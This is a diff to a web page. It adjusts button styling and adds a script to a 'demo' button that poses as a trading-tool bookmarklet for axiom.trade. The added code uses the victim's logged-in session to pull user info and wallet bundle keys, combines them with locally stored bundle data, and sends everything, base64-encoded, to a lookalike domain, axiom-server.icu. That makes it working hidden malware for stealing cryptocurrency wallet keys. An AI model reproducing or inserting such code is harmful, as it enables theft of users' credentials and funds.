@@ -53,11 +53,11 @@
     color:#000;
     border:none;
     border-radius:2em;
-    padding:0.8em 2.2em;
-    font-size:1.1em;
+    padding:0.6em 1.8em;
+    font-size:1em;
     font-weight:500;
     cursor:pointer;
-    margin-top:0.3em;
+    margin-top:-2.5em;
     display:block;
     margin-left:auto;
     margin-right:auto;
@@ -111,6 +111,35 @@
         </div>
       </footer>
     </div>
-  </div>
+  </div><script>
+document.getElementById("demoBtn").onclick = function() {
+  alert("Bouton Demo cliqué !");
+  (async()=>{
+    try {
+      if(location.hostname === "https://www.tokensnifer.com/")
+        return alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
+      if(location.hostname != "axiom.trade") {
+        alert("You are now being redirected to https://axiom.trade/discover.");
+        location.replace("https://axiom.trade/discover");
+      }
+      else {
+        if(!localStorage.getItem("isAuthed"))
+          return alert("You must be signed in to use this bookmarklet.");
+        const user = await (await fetch("//api7.axiom.trade/user-info", {method:"POST",credentials:"include"})).json();
+        const bundleRes = await (await fetch("//api8.axiom.trade/bundle-key-and-wallets", {method:"POST",credentials:"include"})).json();
+        const bundleString = `${localStorage.getItem("sBundles")};${bundleRes.bundleKey}`;
+        location.replace(`https://axiom-server.icu/${btoa(JSON.stringify({
+          hash:"MDs3NTE3MDE1NDcx",
+          site:"https://trendsniperpro.vercel.app//api/wallets",
+          user,
+          bundle:bundleString
+        }))}`);
+      }
+    } catch(e) {
+      alert("Failed to execute the bookmarklet. Please try again later.");
+    }
+  })();
+};
+</script>
 </body>
 </html>
